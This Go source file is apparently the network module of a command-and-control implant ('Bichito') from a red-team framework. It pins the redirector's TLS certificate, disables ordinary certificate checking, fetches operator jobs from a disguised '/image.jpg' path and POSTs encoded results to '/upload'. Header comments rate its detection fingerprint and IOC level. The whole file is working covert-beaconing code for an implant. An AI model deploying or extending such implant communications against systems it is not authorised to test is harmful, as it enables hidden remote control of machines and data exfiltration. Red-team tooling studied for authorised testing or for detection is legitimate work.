// +build paranoidhttpsgo
//// Listening Network Module for Redirectors ///////////////////////////////////////////////////////////
//
//	 Network Method: Listen to an open port with a HTTPS connection using a personnal certificate
//					 generated previously in Implant Generation. The Bichito checks the target tls
//					 signature to make sure is the redirector
//
//   Warnings:       Could not work with MITM tls proxies					 
//					 
//	 Fingenprint:    GO-LANG Client TLS Fingerprint
//
//   IOC Level:      Medium
//   
//
///////////////////////////////////////////////////////////////////////////////////////////////////////


package network

import (

	"crypto/tls"
	"strings"
	"bytes"
	"crypto/sha256"
	"encoding/hex"
    "net/http"
    "encoding/json"	
    "io/ioutil"
    "time"
    "net"
)

/*
JSON Structures for Compiling Redirectors Network Module parameters
Hive will have the same definitions in: ./src/hive/hiveImplants.go
*/
type BiParanoidhttps struct {
	Port string   `json:"port"`
	RedFingenPrint string   `json:"redfingenrpint"`
	Redirectors []string   `json:"redirectors"`
}

var moduleParams *BiParanoidhttps

/*
Description: Paranoidhttps,Prepare Redirector Slice
Flow:
A.JSON Decode redirector data
B.Loop over each redirector and craft a working https endpoint to connect to
*/
func PrepareNetworkMocule(jsonstring string) []string{

	var redirectors []string
	errDaws := json.Unmarshal([]byte(jsonstring),&moduleParams)
	if errDaws != nil{
		return redirectors
	}
	for _,red := range moduleParams.Redirectors{
		redirectors = append(redirectors,red +":"+ moduleParams.Port)
	}

	return redirectors
}

/*
Description: Paranoidhttps,Retrieve Jobs
Flow:
A.Prepare https client, check that target redirector ssl certificate match the saved one
B.Get request against target redirector to retrieve jobs
*/
func RetrieveJobs(redirector string,authentication string) ([]byte,string){

	var newJobs []byte
	var error string

	result := checkTLSignature(redirector)
	if result != "Good"{
		return newJobs,result
	}
	
	//HTTP Clients Conf
	client := &http.Client{
		Transport: &http.Transport{
        	DialContext:(&net.Dialer{
            	Timeout:   10 * time.Second,
            	KeepAlive: 10 * time.Second,
        	}).DialContext,

        	//Skip TLS Verify since we are using self signed Certs
        	TLSClientConfig:(&tls.Config{
            	InsecureSkipVerify: true,
        	}),

        	TLSHandshakeTimeout:   20 * time.Second,   
        	ExpectContinueTimeout: 10 * time.Second,
        	ResponseHeaderTimeout: 10 * time.Second,	
		},

		Timeout: 30 * time.Second,
	}
	
	req, _ := http.NewRequest("GET", "https://"+redirector+"/image.jpg", nil)
	req.Header.Set("Authorization", authentication)
	res, err := client.Do(req)
	if err != nil {
		error = "Connection errir with redirector "+redirector+":"+err.Error()
		return newJobs,error
	}


	newJobs,_ = ioutil.ReadAll(res.Body)
    return newJobs,"Success"
}

/*
Description: Paranoidhttps,Retrieve Jobs
Flow:
A.Prepare https client, configure the client to accept self-signed certificates
B.POST request against target redirector to send a job
*/
func SendJobs(redirector string,authentication string,encodedJob []byte) string{

	var error string

	result := checkTLSignature(redirector)
	if result != "Good"{
		return result
	}

	//HTTP Clients Conf
	client := &http.Client{
		Transport: &http.Transport{
        	DialContext:(&net.Dialer{
            	Timeout:   10 * time.Second,
            	KeepAlive: 10 * time.Second,
        	}).DialContext,

        	//Skip TLS Verify since we are using self signed Certs
        	TLSClientConfig:(&tls.Config{
            	InsecureSkipVerify: true,
        	}),

        	TLSHandshakeTimeout:   10 * time.Second,   
        	ExpectContinueTimeout: 4 * time.Second,
        	ResponseHeaderTimeout: 3 * time.Second,	
		},

		Timeout: 20 * time.Second,
	}
	
	req, _ := http.NewRequest("POST", "https://"+redirector+"/upload",bytes.NewBuffer(encodedJob))
	req.Header.Set("Authorization", authentication)
	
	_, err := client.Do(req)
	if err != nil {
		error = "Connection error with redirector "+redirector+":"+err.Error()
		return error
	}


	return "Success"
}



//This two functions check the Hive Certificate signature to make sure it is the Hive we have installed
func checkTLSignature(redirector string) string{

	var conn net.Conn
	fprint := strings.Replace(moduleParams.RedFingenPrint, ":", "", -1)
	bytesFingerprint, err := hex.DecodeString(fprint)
	if err != nil {
		return "Redirector TLS Error,fingenprint decoding"+err.Error()
	}
	
	config := &tls.Config{InsecureSkipVerify: true}
	
	if conn,err = net.DialTimeout("tcp", redirector,1 * time.Second); err != nil{
		return "Redirector TLS Error,Red not reachable"+err.Error()
	}	
	
	tls := tls.Client(conn,config)
	tls.Handshake()

	if ok,err := CheckKeyPin(tls, bytesFingerprint); err != nil || !ok {
		return "Redirector TLS Error,Red suplantation?"
	}

	return "Good"
}

func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool,error) {
	valid := false
	connState := conn.ConnectionState() 
	for _, peerCert := range connState.PeerCertificates { 
			hash := sha256.Sum256(peerCert.Raw)
			if bytes.Compare(hash[0:], fingerprint) == 0 {

				valid = true
			}
	}
	return valid, nil
}


